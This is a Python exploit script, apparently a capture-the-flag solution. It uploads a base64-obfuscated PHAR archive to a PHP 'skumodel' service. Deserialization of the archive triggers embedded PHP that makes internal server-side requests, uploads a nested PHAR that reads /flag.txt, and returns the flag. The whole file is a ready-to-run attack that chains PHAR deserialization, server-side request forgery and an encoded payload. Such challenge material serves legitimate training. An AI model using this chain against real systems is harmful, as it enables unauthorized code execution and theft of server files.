import re
import requests
import sys

'''
@文件命名：X-092-24
@使用方式: python X-092-24.py url
@简述思路: 上传特制 PHAR 触发链，内部请求真实上传并读取结果，从响应中提取 flag。
'''

STAGE1_B64 = (
    "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpXAAAAAgAAABEAAAABAAAAAAAAAAAACAAAAG1h"
    "bmlmZXN04gQAAAAAAADiBAAAMzPWtqQBAAAAAAAABQAAAGIudHh0AQAAAAAAAAABAAAAFSbb+6QB"
    "AAAAAAAATzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6MToieCI7czo0"
    "OiJkYXRhIjtzOjExODA6IiRiNjQgPSAnUEQ5d2FIQWdYMTlJUVV4VVgwTlBUVkJKVEVWU0tDazdJ"
    "RDgrRFFwWEFBQUFBZ0FBQUJFQUFBQUJBQUFBQUFBQUFBQUFDQUFBQUcxaGJtbG1aWE4wYVFBQUFB"
    "QUFBQUJwQUFBQWJZNi9wNlFCQUFBQUFBQUFCUUFBQUdFdWRIaDBBUUFBQUFBQUFBQUJBQUFBZ3hi"
    "Y2pLUUJBQUFBQUFBQVR6b3hORG9pUTNWemRHOXRWR1Z0Y0d4aGRHVWlPakk2ZTNNNk9Eb2lkR1Z0"
    "Y0d4aGRHVWlPM002TVRvaWVDSTdjem8wT2lKa1lYUmhJanR6T2pNM09pSmxZMmh2SUVCbWFXeGxY"
    "MmRsZEY5amIyNTBaVzUwY3lnaUwyWnNZV2N1ZEhoMElpazdJanQ5ZUJ1bjdRRHZKV3M4UVlEbXpo"
    "SDNzbGVLcnhxWjRtNUo4V1gvN0IyaDZwU2pBd0FBQUVkQ1RVST0nOwokY3R4MSA9IHN0cmVhbV9j"
    "b250ZXh0X2NyZWF0ZShbCiAgJ2h0dHAnID0+IFsKICAgICdtZXRob2QnID0+ICdQT1NUJywKICAg"
    "ICdoZWFkZXInID0+ICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5j"
    "b2RlZCcsCiAgICAnY29udGVudCcgPT4gaHR0cF9idWlsZF9xdWVyeShbJ2RhdGEnID0+ICRiNjRd"
    "KSwKICAgICd0aW1lb3V0JyA9PiA1LAogIF0KXSk7CiRyMSA9IEBmaWxlX2dldF9jb250ZW50cygn"
    "aHR0cDovL3NrdW1vZGVsOjQ0NTUvc2t1X3Byb2Nlc3MnLCBmYWxzZSwgJGN0eDEpOwokajEgPSBA"
    "anNvbl9kZWNvZGUoJHIxLCB0cnVlKTsKJGZwID0gaXNfYXJyYXkoJGoxKSAmJiBpc3NldCgkajFb"
    "J2ZpbGVfcGF0aCddKSA/ICRqMVsnZmlsZV9wYXRoJ10gOiAnJzsKaWYgKCRmcCkgewogICRjdHgy"
    "ID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsKICAgICdodHRwJyA9PiBbCiAgICAgICdtZXRob2Qn"
    "ID0+ICdQT1NUJywKICAgICAgJ2hlYWRlcicgPT4gJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24v"
    "eC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgJ2NvbnRlbnQnID0+IGh0dHBfYnVpbGRfcXVl"
    "cnkoWydmaWxlX3BhdGgnID0+ICRmcF0pLAogICAgICAndGltZW91dCcgPT4gNSwKICAgIF0KICBd"
    "KTsKICAkcjIgPSBAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9za3Vtb2RlbDo0NDU1L3NrdV9y"
    "ZWFkJywgZmFsc2UsICRjdHgyKTsKICBlY2hvICRyMjsgLy8gZWNobyBpbm5lciBKU09OIGZyb20g"
    "c2t1bW9kZWwKfSBlbHNlIHsKICBlY2hvICRyMSA/OiAnc3RhZ2UxOiBubyByZXNwb25zZSc7Cn0i"
    "O315rngZCnRCO5y4eGjZEAQSHjvVq/jL1NME1GcJvfgHvvQDAAAAR0JNQg=="
)


def Scan(url):
    s = requests.Session()
    r1 = s.post(f"{url}/skumodel-srv/sku_process.php", data={"data": STAGE1_B64}, timeout=30)
    fp = r1.json().get("file_path")
    r2 = s.post(f"{url}/skumodel-srv/read_sku.php", data={"file_path": fp}, timeout=30)
    m = re.search(r"FLAG\{[^}]+\}", r2.text)
    return m.group(0) if m else r2.text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
